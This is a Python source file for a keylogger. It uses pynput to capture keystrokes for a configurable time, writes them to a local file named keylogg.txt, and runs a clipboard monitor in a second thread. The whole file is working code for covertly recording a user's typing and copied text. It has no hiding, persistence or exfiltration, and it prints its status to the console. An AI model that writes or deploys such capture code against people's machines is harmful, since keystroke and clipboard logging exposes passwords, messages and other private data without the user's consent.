from pynput import keyboard
import time
import threading
from clipboard_monitor import monitor_clipboard
from set_time import monitor_time

def on_release(key):
    global keylogg, start_time, set_time
    current_time = time.time()
    elapsed_time = current_time - start_time
    
    if elapsed_time <= set_time:  # Continue capturing keys if less than set_time seconds have passed
        with open("keylogg.txt", 'a') as logKey:
            try:
                if key == keyboard.Key.enter:
                    keylogg += "\n"
                elif key == keyboard.Key.tab:
                    keylogg += "\t"
                elif key == keyboard.Key.space:
                    keylogg += " "
                elif key == keyboard.Key.shift:
                    pass
                elif key == keyboard.Key.backspace and len(keylogg) == 0:
                    pass
                elif key == keyboard.Key.backspace and len(keylogg) > 0:
                    keylogg = keylogg[:-1]
                elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                    pass
                else:
                    keylogg += key.char 
            except AttributeError:
                pass
    else:
        return False  # Stop listener after set_time seconds

    # Additional check to stop after set_time seconds if using 'return False' doesn't work in your version
    if elapsed_time > set_time:
        return False

def keylogger_thread():
    global keylogg, start_time, set_time
    keylogg = ""
    start_time = time.time()

    with keyboard.Listener(on_release=on_release) as listener:
        time.sleep(set_time)  # Wait for set_time seconds
        listener.stop()

    # After listener stops (either by time limit or user exiting)
    if keylogg == "":
        with open("keylogg.txt", 'a') as logKey:
            logKey.write('No keys were logged within the first {0} seconds.\n'.format(set_time))
    else:
        with open("keylogg.txt", 'a') as logKey:
            logKey.write('Final keylogg:\n{0}'.format(keylogg))

    print('Keylogger thread finished.')

if __name__ == "__main__":
    set_time = monitor_time()  # Set the time limit for keylogging
    print(set_time)
    # Create a thread for keylogger
    keylogger_thread = threading.Thread(target=keylogger_thread)
    
    # Create a thread for clipboard monitor
    clipboard_thread = threading.Thread(target=monitor_clipboard, args=(set_time,))
    
    # Start both threads
    keylogger_thread.start()
    clipboard_thread.start()
    
    # Wait for both threads to finish
    keylogger_thread.join()
    clipboard_thread.join()
    
    print("Both threads finished. Exiting main program.")
